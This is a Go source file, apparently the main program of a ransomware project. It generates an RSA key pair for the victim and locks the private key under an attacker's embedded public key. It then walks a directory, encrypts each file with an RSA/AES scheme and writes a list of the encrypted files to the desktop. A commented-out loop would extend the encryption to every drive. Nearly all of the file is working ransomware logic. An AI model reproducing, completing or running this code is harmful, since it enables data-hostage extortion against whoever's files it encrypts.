package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/rsaLib"
	"ransomware/io"
	"ransomware/utils"
	"sync"
)

var (
	filesToVisit  = make(chan io.File)
	encryptedList []string
	waitGroup     sync.WaitGroup
	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
)

func main() {

	cPubKey, err := generateClientKeys(sPubKey)
	if err != nil {
		panic(err)
	}

	currentDirectory, _ := os.Getwd()
	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
	encryptFiles(dir, cPubKey)

	// drives := io.GetDrives()
	// for _, drive := range drives {
	// 	encryptFiles(drive, cPubKey)
	// }

	defer generateDesktopFiles()
}

func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
	cPrivKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	cPubKey := &(cPrivKey.PublicKey)

	privBytes := x509.MarshalPKCS1PrivateKey(cPrivKey)
	privBytesEncrypted, err := encryption.RSAAESEncrypt(privBytes, servPubKey)
	if err != nil {
		return nil, err
	}

	keyFile, err := os.Create("cPrivateKey.encrypted")
	if err != nil {
		return nil, err
	}
	_, err = keyFile.Write(privBytesEncrypted)
	if err != nil {
		return nil, err
	}

	return cPubKey, nil
}

func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {

	var ext string
	var err error

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}
				ext = filepath.Ext(path)
				if ext != ".encrypted" {
					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
				}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
			if err == nil {
				encryptedList = append(encryptedList, file.Path)
			}
		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}

func generateDesktopFiles() {

	var text string = "------ENCRYPTED FILES------\n\n"
	desktopPath, err := utils.GetDesktopPath()
	if err != nil {
		panic(err)
	}

	for _, filePath := range encryptedList {
		text = text + filePath + "\n"
	}
	bytes := []byte(text)
	os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
}
